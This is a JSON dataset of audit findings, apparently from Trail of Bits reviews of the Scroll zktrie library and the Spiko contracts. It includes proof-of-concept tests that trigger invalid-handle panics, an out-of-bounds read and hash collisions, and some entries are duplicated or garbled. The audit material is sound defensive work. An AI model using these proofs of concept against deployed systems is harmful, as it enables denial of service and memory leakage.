        "body": "The interaction between the Rust and Go codebases relies on the use of cgo.Handles. These handles are a way to encode Go pointers between Go and, in this case, Rust. Handles can be passed back to the Go runtime, which will be able to retrieve the original Go value. According to the documentation, it is safe to represent an error with the zero value, as this is an invalid handle. However, the implementation should take this into account when retrieving the Go values from the handle, as both the Value and Delete methods for Handles panic on invalid handles. The codebase contains multiple instances of this behavior. For example, the NewTrieNode function will return 0 if it nds an error: // parse raw bytes and create the trie node //export NewTrieNode func NewTrieNode(data *C.char, sz C.int) C.uintptr_t { bt := C.GoBytes(unsafe.Pointer(data), sz) n, err := trie.NewNodeFromBytes(bt) if err != nil { return 0 } // calculate key for caching if _, err := n.NodeHash(); err != nil { return 0 } return C.uintptr_t(cgo.NewHandle(n)) } Figure 12.1: zktrie/lib.go#7388 However, neither the Rust API nor the Go API takes these cases into consideration. Looking at the Rust API, the ZkTrieNode::parse function will simply save the result from NewTrieNode regardless of whether it is a valid or invalid Go handle. Then, calling any other function will cause a runtime error due to the use of an invalid handle. This issue is present in all functions implemented for ZkTrieNode: drop, node_hash, and value_hash. We now precisely describe how it fails in the drop function case. After constructing a malformed ZkTrieNode, the drop function will call FreeTrieNode on the invalid handle: impl Drop for ZkTrieNode { fn drop(&mut self) { unsafe { FreeTrieNode(self.trie_node) }; } } Figure 12.2: zktrie/src/lib.rs#127131 This will cause a panic given the direct use of the invalid handle on the Handle.Delete function: // free created trie node //export FreeTrieNode func FreeTrieNode(p C.uintptr_t) { freeObject(p) } func freeObject(p C.uintptr_t) { h := cgo.Handle(p) h.Delete() } Figure 12.3: zktrie/lib.go#114131 The following test triggers the described issue: #[test] fn invalid_handle_drop() { init_hash_scheme(hash_scheme); let _nd = ZkTrieNode::parse(&hex::decode(\"0001\").unwrap()); } // // panic: runtime/cgo: misuse of an invalid Handle running 1 test /opt/homebrew/Cellar/go/1.18.3/libexec/src/runtime/cgo/handle.go:137 // goroutine 17 [running, locked to thread]: // runtime/cgo.Handle.Delete(...) // // main.freeObject(0x14000060d01?) // // main.FreeTrieNode(...) // /zktrie/lib.go:130 +0x5c /zktrie/lib.go:116 Figure 12.4: A test case that triggers the nding in the drop case Exploit Scenario An attacker provides malformed data to ZkTrieNode::parse, causing it to contain an invalid Go handle. This subsequently causes the system to crash when one of the value_hash or node_hash functions is called or eventually when the node variable goes out of scope and the drop function is called. Recommendations Short term, ensure that invalid handles are not used with Delete or Value; for this, document the Go exported function requirements, and ensure that Rust checks for this before these functions are called. Long term, add tests that exercise all return paths for both the Go and Rust libraries.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Unnecessary unsafe pointer manipulation in Node.Data() ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The Node.Data() function returns the underlying value of a leaf node as a byte slice (i.e., []byte). Since the ValuePreimage eld is a slice of zkt.Byte32s, returning a value of type []byte requires some form of conversion. The implementation, shown in gure 13.1, uses the reflect and unsafe packages to manually construct a byte slice that overlaps with ValuePreimage. case NodeTypeLeaf: var data []byte hdata := (*reflect.SliceHeader)(unsafe.Pointer(&data)) //TODO: uintptr(reflect.ValueOf(n.ValuePreimage).UnsafePointer()) should be more elegant but only available until go 1.18 hdata.Data = uintptr(unsafe.Pointer(&n.ValuePreimage[0])) hdata.Len = 32 * len(n.ValuePreimage) hdata.Cap = hdata.Len return data Figure 13.1: Unsafe casting from []zkt.Byte32 to []byte (trie/zk_trie_node.go#174181) Manual construction of slices and unsafe casting between pointer types are error-prone and potentially very dangerous. This particular case appears to be harmless, but it is unnecessary and can be replaced by allocating a byte buer and copying ValuePreimage into it. Recommendations Short term, replace this unsafe cast with code that allocated a byte buer and then copies ValuePreimage, as described above. Long term, evaluate all uses of unsafe pointer manipulation and replace them with a safe alternative where possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "14. NewNodeFromBytes does not fully validate its input ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The NewNodeFromBytes function parses a byte array into a value of type Node. It checks several requirements for the Node value and returns nil and an error value if those checks fail. However, it allows a zero-length value for ValuePreimage (which allows TOB-ZKTRIE-10 to be exploited) and ignores extra data at the end of leaf and empty nodes. As shown in gure 14.1, the exact length of the byte array is checked in the case of a branch, but is unchecked for empty nodes and only lower-bounded in the case of a leaf node. case NodeTypeParent: if len(b) != 2*zkt.HashByteLen { return nil, ErrNodeBytesBadSize } n.ChildL = zkt.NewHashFromBytes(b[:zkt.HashByteLen]) n.ChildR = zkt.NewHashFromBytes(b[zkt.HashByteLen : zkt.HashByteLen*2]) case NodeTypeLeaf: if len(b) < zkt.HashByteLen+4 { return nil, ErrNodeBytesBadSize } n.NodeKey = zkt.NewHashFromBytes(b[0:zkt.HashByteLen]) mark := binary.LittleEndian.Uint32(b[zkt.HashByteLen : zkt.HashByteLen+4]) preimageLen := int(mark & 255) n.CompressedFlags = mark >> 8 n.ValuePreimage = make([]zkt.Byte32, preimageLen) curPos := zkt.HashByteLen + 4 if len(b) < curPos+preimageLen*32+1 { return nil, ErrNodeBytesBadSize }  if preImageSize != 0 { if len(b) < curPos+preImageSize { return nil, ErrNodeBytesBadSize } n.KeyPreimage = new(zkt.Byte32) copy(n.KeyPreimage[:], b[curPos:curPos+preImageSize]) } case NodeTypeEmpty: break Figure 14.1: preimageLen and len(b) are not fully checked. (trie/zk_trie_node.go#78111) Recommendations Short term, add checks of the total byte array length and the preimageLen eld to NewNodeFromBytes. Long term, explicitly document the serialization format for nodes, and add tests for incorrect serialized nodes.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "15. init_hash_scheme is not thread-safe ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "zktrie provides a safe-Rust interface around its Go implementation. Safe Rust statically prevents various memory safety errors, including null pointer dereferences and data races. However, when unsafe Rust is wrapped in a safe interface, the unsafe code must provide any guarantees that safe Rust expects. For more information about writing unsafe Rust, consult The Rustonomicon. The init_hash_scheme function, shown in gure 15.1, calls InitHashScheme, which is a cgo wrapper for the Go function shown in gure 15.2. pub fn init_hash_scheme(f: HashScheme) { unsafe { InitHashScheme(f) } } Figure 15.1: src/lib.rs#6769 // notice the function must use C calling convention //export InitHashScheme func InitHashScheme(f unsafe.Pointer) { hash_f := C.hashF(f) C.init_hash_scheme(hash_f) zkt.InitHashScheme(hash_external) } Figure 15.2: lib.go#6571 InitHashScheme calls two other functions: rst, a C function called init_hash_scheme and second, a second Go function (this time, in the hash module) called InitHashScheme. This second Go function is synchronized with a sync.Once object, as shown in gure 15.3. func InitHashScheme(f func([]*big.Int) (*big.Int, error)) { setHashScheme.Do(func() { hashScheme = f }) } Figure 15.3: types/hash.go#29 However, the C function init_hash_scheme, shown in gure 15.4, performs a completely unsynchronized write to the global variable hash_scheme, which can lead to a data race. void init_hash_scheme(hashF f){ hash_scheme = f; } Figure 15.4: c.go#1315 However, the only potential data race comes from multi-threaded initialization, which contradicts the usage recommendation in the README, shown in gure 15.5. We must init the crate with a poseidon hash scheme before any actions:  zktrie_util::init_hash_scheme(hash_scheme); Figure 15.5: README.md#824 Recommendations Short term, add synchronization to C.init_hash_scheme, perhaps by using the same sync.Once object as hash.go. Long term, carefully review all interactions between C and Rust, paying special attention to anything mentioned in the How Safe and Unsafe Interact section of the Rustonomicon.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "16. Safe-Rust ZkMemoryDb interface is not thread-safe ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The Go function Database.Init, shown in gure 16.1, is not thread-safe. In particular, if it is called from multiple threads, a data race may occur when writing to the map. In normal usage, that is not a problem; any user of the Database.Init function is expected to run the function only during initialization, when synchronization is not required. // Init flush db with batches of k/v without locking func (db *Database) Init(k, v []byte) { db.db[string(k)] = v } Figure 16.1: trie/zk_trie_database.go#4043 However, this function is called by the safe Rust function ZkMemoryDb::add_node_bytes (gure 16.2) via the cgo function InitDbByNode (gure 16.3): pub fn add_node_bytes(&mut self, data: &[u8]) -> Result<(), ErrString> { let ret_ptr = unsafe { InitDbByNode(self.db, data.as_ptr(), data.len() as c_int) }; if ret_ptr.is_null() { Ok(()) } else { Err(ret_ptr.into()) } } Figure 16.2: src/lib.rs#171178 // flush db with encoded trie-node bytes //export InitDbByNode func InitDbByNode(pDb C.uintptr_t, data *C.uchar, sz C.int) *C.char { h := cgo.Handle(pDb) db := h.Value().(*trie.Database) bt := C.GoBytes(unsafe.Pointer(data), sz) n, err := trie.DecodeSMTProof(bt) if err != nil { return C.CString(err.Error()) } else if n == nil { //skip magic string return nil } hash, err := n.NodeHash() if err != nil { return C.CString(err.Error()) } db.Init(hash[:], n.CanonicalValue()) return nil } Figure 16.3: lib.go#147170 Safe Rust is required to never invoke undened behavior, such as data races. When wrapping unsafe Rust code, including FFI calls, care must be taken to ensure that safe Rust code cannot invoke undened behavior through that wrapper. (Refer to the How Safe and Unsafe Interact section of the Rustonomicon.) Although add_node_bytes takes &mut self, and thus cannot be called from more than one thread at once, a second reference to the database can be created in a way that Rusts borrow checker cannot track, by calling new_trie. Figures 16.4, 16.5, and 16.6 show the call trace by which a pointer to the Database is stored in the ZkTrieImpl. pub fn new_trie(&mut self, root: &Hash) -> Option<ZkTrie> { let ret = unsafe { NewZkTrie(root.as_ptr(), self.db) }; if ret.is_null() { None } else { Some(ZkTrie { trie: ret }) } } Figure 16.4: src/lib.rs#181189 func NewZkTrie(root_c *C.uchar, pDb C.uintptr_t) C.uintptr_t { h := cgo.Handle(pDb) db := h.Value().(*trie.Database) root := C.GoBytes(unsafe.Pointer(root_c), 32) zktrie, err := trie.NewZkTrie(*zkt.NewByte32FromBytes(root), db) if err != nil { return 0 } return C.uintptr_t(cgo.NewHandle(zktrie)) } Figure 16.5: lib.go#174185 func NewZkTrieImpl(storage ZktrieDatabase, maxLevels int) (*ZkTrieImpl, error) { return NewZkTrieImplWithRoot(storage, &zkt.HashZero, maxLevels) } // NewZkTrieImplWithRoot loads a new ZkTrieImpl. If in the storage already exists one // will open that one, if not, will create a new one. func NewZkTrieImplWithRoot(storage ZktrieDatabase, root *zkt.Hash, maxLevels int) (*ZkTrieImpl, error) { mt := ZkTrieImpl{db: storage, maxLevels: maxLevels, writable: true} mt.rootHash = root if *root != zkt.HashZero { _, err := mt.GetNode(mt.rootHash) if err != nil { return nil, err } } return &mt, nil } Figure 16.6: trie/zk_trie_impl.go#5672 Then, by calling add_node_bytes in one thread and ZkTrie::root() or some other method that calls Database.Get(), one can trigger a data race from safe Rust. Exploit Scenario A Rust-based library consumer uses threads to improve performance. Relying on Rusts type system, they assume that thread safety has been enforced and they run ZkMemoryDb::add_node_bytes in a multi-threaded scenario. A data race occurs and the system crashes. Recommendations Short term, add synchronization to Database.Init, such as by calling db.lock.Lock(). Long term, carefully review all interactions between C and Rust, paying special attention to guidance in the How Safe and Unsafe Interact section of the Rustonomicon.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Some Node functions return the zero hash instead of errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The Node.NodeHash and Node.ValueHash methods each return the zero hash in cases in which an error return would be more appropriate. In the case of NodeHash, all invalid node types return the zero hash, the same hash as an empty node (shown in gure 17.1). case NodeTypeEmpty: // Zero n.nodeHash = &zkt.HashZero default: n.nodeHash = &zkt.HashZero } } return n.nodeHash, nil Figure 17.1: trie/zk_trie_node.go#149155 In the case of ValueHash, non-leaf nodes have a zero value hash, as shown in gure 17.2. func (n *Node) ValueHash() (*zkt.Hash, error) { if n.Type != NodeTypeLeaf { return &zkt.HashZero, nil } Figure 17.2: trie/zk_trie_node.go#160163 In both of these cases, returning an error is more appropriate and prevents potential confusion if client software assumes that the main return value is valid whenever the error returned is nil. Recommendations Short term, have the functions return an error in these cases instead of the zero hash. Long term, ensure that exceptional cases lead to non-nil error returns rather than default values. 18. get_account can read past the bu\u0000er Severity: High Diculty: Medium Type: Data Exposure Finding ID: TOB-ZKTRIE-18 Target: lib.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "4. BuildZkTrieProof does not populate NodeAux.Value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "A nonexistence proof for some key k in a Merkle tree is a Merkle path from the root of the tree to a subtree, which would contain k if it were present but which instead is either an empty subtree or a subtree with a single leaf k2 where k != k2. In the zktrie codebase, that second case is handled by the NodeAux eld in the Proof struct, as illustrated in gure 4.1. // Verify the proof and calculate the root, nodeHash can be nil when try to verify // a nonexistent proof func (proof *Proof) Verify(nodeHash, nodeKey *zkt.Hash) (*zkt.Hash, error) { if proof.Existence { if nodeHash == nil { return nil, ErrKeyNotFound } return proof.rootFromProof(nodeHash, nodeKey) } else { if proof.NodeAux == nil { return proof.rootFromProof(&zkt.HashZero, nodeKey) } else { if bytes.Equal(nodeKey[:], proof.NodeAux.Key[:]) { return nil, fmt.Errorf(\"non-existence proof being checked against hIndex equal to nodeAux\") } midHash, err := LeafHash(proof.NodeAux.Key, proof.NodeAux.Value) if err != nil { return nil, err } return proof.rootFromProof(midHash, nodeKey) } } } Figure 4.1: The Proof.Verify method (zktrie/trie/zk_trie_impl.go#609632) When a non-inclusion proof is generated, the BuildZkTrieProof function looks up the other leaf node and uses its NodeKey and valueHash elds to populate the Key and Value elds of NodeAux, as shown in gure 4.2. However, the valueHash eld of this node may be nil, causing NodeAux.Value to be nil and causing proof verication to crash with a nil pointer dereference error, which can be triggered by the test case shown in gure 4.3. n, err := getNode(nextHash) if err != nil { return nil, nil, err } switch n.Type { case NodeTypeEmpty: return p, n, nil case NodeTypeLeaf: if bytes.Equal(kHash[:], n.NodeKey[:]) { p.Existence = true return p, n, nil } // We found a leaf whose entry didn't match hIndex p.NodeAux = &NodeAux{Key: n.NodeKey, Value: n.valueHash} return p, n, nil Figure 4.2: Populating NodeAux (zktrie/trie/zk_trie_impl.go#560574) func TestMerkleTree_GetNonIncProof(t *testing.T) { zkTrie := newTestingMerkle(t, 10) t.Run(\"Testing for non-inclusion proofs\", func(t *testing.T) { k := zkt.Byte32{1} k_value := (&[1]zkt.Byte32{{1}})[:] k_other := zkt.Byte32{2} k_hash_int, _ := k.Hash() k_other_hash_int, _ := k_other.Hash() k_hash := zkt.NewHashFromBigInt(k_hash_int) k_other_hash := zkt.NewHashFromBigInt(k_other_hash_int) assert.Nil(t, zkTrie.TryUpdate(k_hash, 0, k_value)) getNode := func(hash *zkt.Hash) (*Node, error) { return zkTrie.GetNode(hash) } proof, _, err := BuildZkTrieProof(zkTrie.rootHash, k_other_hash_int, 10, getNode) assert.Nil(t, err) assert.False(t, proof.Existence) proof_root, _ := proof.Verify(nil, k_other_hash) assert.Equal(t, proof_root, zkTrie.rootHash) }) } Figure 4.3: A test case that will crash with a nil dereference of NodeAux.Value Adding a call to n.NodeHash() inside BuildZkTrieProof, as shown in gure 4.4, xes this problem. n, err := getNode(nextHash) if err != nil { return nil, nil, err } switch n.Type { case NodeTypeEmpty: return p, n, nil case NodeTypeLeaf: if bytes.Equal(kHash[:], n.NodeKey[:]) { p.Existence = true return p, n, nil } // We found a leaf whose entry didn't match hIndex p.NodeAux = &NodeAux{Key: n.NodeKey, Value: n.valueHash} return p, n, nil Figure 4.4: Adding the highlighted n.NodeHash() call xes this problem. (zktrie/trie/zk_trie_impl.go#560574) Exploit Scenario An adversary or ordinary user requests that the software generate and verify a non-inclusion proof, and the software crashes, leading to the loss of service. Recommendations Short term, x BuildZkTrieProof by adding a call to n.NodeHash(), as described above. Long term, ensure that all major code paths in important functions, such as proof generation and verication, are tested. The Go coverage analysis report generated by the command go test -cover -coverprofile c.out && go tool cover -html=c.out shows that this branch in Proof.Verify is not currently tested: Figure 4.5: The Go coverage analysis report",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Leaf nodes with di\u0000erent values may have the same hash ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The hash value of a leaf node is derived from the hash of its key and its value. A leaf nodes value comprises up to 256 32-byte elds, and that values hash is computed by passing those elds to the HashElems function. HashElems hashes these elds in a Merkle treestyle binary tree pattern, as shown in gure 5.1. func HashElems(fst, snd *big.Int, elems ...*big.Int) (*Hash, error) { l := len(elems) baseH, err := hashScheme([]*big.Int{fst, snd}) if err != nil { return nil, err } if l == 0 { return NewHashFromBigInt(baseH), nil } else if l == 1 { return HashElems(baseH, elems[0]) } tmp := make([]*big.Int, (l+1)/2) for i := range tmp { if (i+1)*2 > l { tmp[i] = elems[i*2] } else { h, err := hashScheme(elems[i*2 : (i+1)*2]) if err != nil { return nil, err } tmp[i] = h } } return HashElems(baseH, tmp[0], tmp[1:]...) } Figure 5.1: Binary-tree hashing in HashElems (zktrie/types/util.go#936) However, HashElems does not include the number of elements being hashed, so leaf nodes with dierent values may have the same hash, as illustrated in the proof-of-concept test case shown in gure 5.2. func TestMerkleTree_MultiValue(t *testing.T) { t.Run(\"Testing for value collisions\", func(t *testing.T) { k := zkt.Byte32{1} k_hash_int, _ := k.Hash() k_hash := zkt.NewHashFromBigInt(k_hash_int) value1 := (&[3]zkt.Byte32{{1}, {2}, {3}})[:] value1_hash, _ := NewLeafNode(k_hash, 0, value1).NodeHash() first2_hash, _ := zkt.PreHandlingElems(0, value1[:2]) value2 := (&[2]zkt.Byte32{*zkt.NewByte32FromBytes(first2_hash.Bytes()), value2_hash, _ := NewLeafNode(k_hash, 0, value2).NodeHash() assert.NotEqual(t, value1, value2) assert.NotEqual(t, value1_hash, value2_hash) {3}})[:] }) } Figure 5.2: A proof-of-concept test case for value collisions Exploit Scenario An adversary inserts a maliciously crafted value into the tree and then creates a proof for a dierent, colliding value. This violates the security requirements of a Merkle tree and may lead to incorrect behavior such as state divergence. Recommendations Short term, modify PrehandlingElems to prex the ValuePreimage array with its length before being passed to HashElems. Long term, document and review all uses of hash functions to ensure that they commit to their inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "17. Some Node functions return the zero hash instead of errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The Node.NodeHash and Node.ValueHash methods each return the zero hash in cases in which an error return would be more appropriate. In the case of NodeHash, all invalid node types return the zero hash, the same hash as an empty node (shown in gure 17.1). case NodeTypeEmpty: // Zero n.nodeHash = &zkt.HashZero default: n.nodeHash = &zkt.HashZero } } return n.nodeHash, nil Figure 17.1: trie/zk_trie_node.go#149155 In the case of ValueHash, non-leaf nodes have a zero value hash, as shown in gure 17.2. func (n *Node) ValueHash() (*zkt.Hash, error) { if n.Type != NodeTypeLeaf { return &zkt.HashZero, nil } Figure 17.2: trie/zk_trie_node.go#160163 In both of these cases, returning an error is more appropriate and prevents potential confusion if client software assumes that the main return value is valid whenever the error returned is nil. Recommendations Short term, have the functions return an error in these cases instead of the zero hash. Long term, ensure that exceptional cases lead to non-nil error returns rather than default values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "18. get_account can read past the bu\u0000er ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "The public get_account function assumes that the provided key corresponds to an account key. However, if the function is instead called with a storage key, it will cause an out-of-bounds read that could leak secret information. In the Rust implementation, leaf nodes can have two types of values: accounts and storage. Account values have a size of either 128 or 160 bytes depending on whether they include one or two code hashes. On the other hand, storage values always have a size of 32 bytes. The get_account function takes a key and returns the account associated with it. In practice, it computes the value pointer associated with the key and reads 128 or 160 bytes at that address. If the key contains a storage value rather than an account value, then get_account reads 96 or 128 bytes past the buer. This is shown in gure 18.4. // get account data from account trie pub fn get_account(&self, key: &[u8]) -> Option<AccountData> { self.get::<ACCOUNTSIZE>(key).map(|arr| unsafe { std::mem::transmute::<[u8; FIELDSIZE * ACCOUNTFIELDS], AccountData>(arr) }) } Figure 18.1: get_account calls get with type ACCOUNTSIZE and key. (zktrie/src/lib.rs#230235) // all errors are reduced to \"not found\" fn get<const T: usize>(&self, key: &[u8]) -> Option<[u8; T]> { let ret = unsafe { TrieGet(self.trie, key.as_ptr(), key.len() as c_int) }; if ret.is_null() { None } else { Some(must_get_const_bytes::<T>(ret)) } } Figure 18.2: get calls must_get_const_bytes with type ACCOUNTSIZE and the pointer returned by TrieGet. (zktrie/src/lib.rs#214223) fn must_get_const_bytes<const T: usize>(p: *const u8) -> [u8; T] { let bytes = unsafe { std::slice::from_raw_parts(p, T) }; let bytes = bytes .try_into() .expect(\"the buf has been set to specified bytes\"); unsafe { FreeBuffer(p.cast()) } bytes } Figure 18.3: must_get_const_bytes calls std::slice::from_raw_parts with type ACCOUNTSIZE and pointer p to read ACCOUNTSIZE bytes from pointer p. (zktrie/src/lib.rs#100107) #[test] fn get_account_overflow() { let storage_key = hex::decode(\"0000000000000000000000000000000000000000000000000000000000000000\") .unwrap(); let storage_data = [10u8; 32]; init_hash_scheme(hash_scheme); let mut db = ZkMemoryDb::new(); let root_hash = Hash::from([0u8; 32]); let mut trie = db.new_trie(&root_hash).unwrap(); trie.update_store(&storage_key, &storage_data).unwrap(); println!(\"{:?}\", trie.get_account(&storage_key).unwrap()); } // Sample output (picked from a sample of ten runs): // [[10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10], [160, 113, 63, 0, 2, 0, 0, 0, 161, 67, 240, 40, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0], [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 24, 158, 63, 0, 2, 0, 0, 0, 17, 72, 240, 40, 1, 0, 0, 0], [16, 180, 85, 254, 1, 0, 0, 0, 216, 179, 85, 254, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]] Figure 18.4: This is a proof-of-concept demonstrating the buer over-read. When run with cargo test get_account_overflow -- --nocapture, it prints 128 bytes with the last 96 bits being over-read. Exploit Scenario Suppose the Rust program leaves secret data in memory. An attacker can interact with the zkTrie to read secret data out-of-bounds. Recommendations Short term, have get_account return an error when it is called on a key containing a storage value. Additionally, this logic should be moved to the Go implementation instead of residing in the Rust bindings. Long term, review all unsafe code, especially code related to pointer manipulation, to prevent similar issues.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Unchecked usize to c_int casts allow hash collisions by length misinterpretation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-scroll-zktrie-securityreview.pdf",
        "body": "A set of unchecked integer casting operations can lead to hash collisions and runtime errors reached from the public Rust interface. The Rust library regularly needs to convert the input functions byte array length from the usize type to the c_int type. Depending on the architecture, these types might dier in size and signedness. This dierence allows an attacker to provide an array with a maliciously chosen length that will be cast to a dierent number. The attacker can choose to manipulate the array and cast the value to a smaller value than the actual array length, allowing the attacker to create two leaf nodes from dierent byte arrays that result in the same hash. The attacker is also able to cast the value to a negative number, causing a runtime error when the Go library calls the GoBytes function. The issue is caused by the explicit and unchecked cast using the as operator and occurs in the ZkTrieNode::parse, ZkMemoryDb::add_node_bytes, ZkTrie::get, ZkTrie::prove, ZkTrie::update, and ZkTrie::delete functions (all of which are public). Figure 19.1 shows ZkTrieNode::parse: impl ZkTrieNode { pub fn parse(data: &[u8]) -> Self { Self { trie_node: unsafe { NewTrieNode(data.as_ptr(), data.len() as c_int) }, } } Figure 19.1: zktrie/src/lib.rs#133138 To achieve a collision for nodes constructed from dierent byte arrays, rst observe that (c_int::MAX as usize) * 2 + 2 is 0 when cast to c_int. Thus, creating two nodes that have the same prex and are then padded with dierent bytes with that length will cause the Go library to interpret only the common prex of these nodes. The following test showcases this exploit. #[test] fn invalid_cast() { init_hash_scheme(hash_scheme); // common prefix let nd = &hex::decode(\"012098f5fb9e239eab3ceac3f27b81e481dc3124d55ffed523a839ee8446b648640101 00000000000000000000000000000000000000000000000000000000018282256f8b00\").unwrap(); // create node1 with prefix padded by zeroes let mut vec_nd = nd.to_vec(); let mut zero_padd_data = vec![0u8; (c_int::MAX as usize) * 2 + 2]; vec_nd.append(&mut zero_padd_data); let node1 = ZkTrieNode::parse(&vec_nd); // create node2 with prefix padded by ones let mut vec_nd = nd.to_vec(); let mut one_padd_data = vec![1u8; (c_int::MAX as usize) * 2 + 2]; vec_nd.append(&mut one_padd_data); let node2 = ZkTrieNode::parse(&vec_nd); // create node3 with just the prefix let node3 = ZkTrieNode::parse(&hex::decode(\"012098f5fb9e239eab3ceac3f27b81e481dc3124d55ffed523a8 39ee8446b64864010100000000000000000000000000000000000000000000000000000000018282256f 8b00\").unwrap()); // all hashes are equal assert_eq!(node1.node_hash(), node2.node_hash()); assert_eq!(node1.node_hash(), node3.node_hash()); } Figure 19.2: A test showing three dierent leaf nodes with colliding hashes This nding also allows an attacker to cause a runtime error by choosing the data array with the appropriate length that will cause the cast to result in a negative number. Figure 19.2 shows a test that triggers the runtime error for the parse function: #[test] fn invalid_cast() { init_hash_scheme(hash_scheme); let data = vec![0u8; c_int::MAX as usize + 1]; println!(\"{:?}\", data.len() as c_int); let _nd = ZkTrieNode::parse(&data); } // running 1 test // -2147483648 // panic: runtime error: gobytes: length out of range // goroutine 17 [running, locked to thread]: _cgo_gotypes.go:102 // main._Cfunc_GoBytes(...) // // main.NewTrieNode.func1(0x14000062de8?, 0x80000000) // /zktrie/lib.go:78 +0x50 // main.NewTrieNode(0x14000062e01?, 0x2680?) /zktrie/lib.go:78 +0x1c // Figure 19.3: A test that triggers the issue, whose output shows the reinterpreted length of the array Exploit Scenario An attacker provides two dierent byte arrays that will have the same node_hash, breaking the assumption that such nodes are hard to obtain. Recommendations Short term, have the code perform the cast in a checked manner by using the c_int::try_from method to allow validation if the conversion succeeds. Determine whether the Rust functions should allow arbitrary length inputs; document the length requirements and assumptions. Long term, regularly run Clippy in pedantic mode to nd and x all potentially dangerous casts. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Event emissions are ignored in the provided test suite ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-spiko-securityreview.pdf",
        "body": "Mutation tests revealed that the provided test suite is not correctly checking for the emission of certain events. In Token.sol , the path that reverts with the custom UnauthorizedFrom reason is not tested thoroughly. When replacing the condition with if(false) or replacing the custom revert with a normal revert, the tests still pass. In Oracle.sol , the emission of the Update event in the publishPrice function is not correctly checked in the tests. In addition, the return value is not checked. In Redemption.sol , several event emissions are not checked:    The RedemptionInitiated event and the burning of token shares in the onTransferReceived function: The burn is checked only via the Transfer event and not via the account balance or total supply of tokens. The RedemptionExecuted event in the executeRedemption function The RedemptionCanceled event and the transfer of token shares in the cancelRedemption function: The transfer is checked only via the Transfer event and not via the account balance.  The EnableOutput event in the registerOutput function Recommendations Short term, x the test suite and ensure that the events are correctly tested. Long term, modify the test suite to consider adversarial cases and help detect malfunctioning tests early. Use linters or other automated analysis tools to detect incorrect statements in the tests.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. publishPrice can modify an existing price or lock the oracle ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-spiko-securityreview.pdf",
        "body": "The Checkpoints library contracts push function allows operators to update the latest price pushed to the oracle, once it has been set, by submitting a new transaction with the same key value as the last addition (for this particular oracle, the key is the timepoint parameter). The Spiko teams repository issue tracker mentions a similar concern, but the case of overwriting the latest value is not considered. Additionally, as warned in the Checkpoints library contract, if the maximum value is accidentally set for the key, the checkpoint will be eectively disabled. 57 function publishPrice ( uint48 timepoint , uint208 price ) public restricted() returns ( uint80 ) { 58 59 60 61 62 63 64 } uint80 roundId = _history.length().toUint80(); _history.push(timepoint, price); emit Update(timepoint, price.toInt256(), roundId); return roundId; Figure 2.1: The publishPrice function ( contracts/oracle/Oracle.sol ) Exploit Scenario An account with oracle operator permissions sends a new price value to the oracle. Later, another oracle operator updates the oracle again but overwrites the latest price value by providing the same timepoint parameter. Since the Spiko oracle updates are meant to be predictable (i.e., always happening at the same time on working days), a third-party protocol is not aware of the second update and temporarily operates on an incorrect oracle price. Alternatively, the oracle operator accidentally sets timepoint to 2**48 - 1 , which disables the oracle because it is unable to receive additional updates. Recommendations Short term, document whether this behavior is expected and, if it is not, prevent oracle updates that have the same timestamp as the last update. To avoid locking the oracle, limit the value of timepoint to the current timestamp plus or minus a security margin. Long term, to avoid edge cases, document the expected value boundaries for critical functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Tokens can be locked in the Redemption contract ",
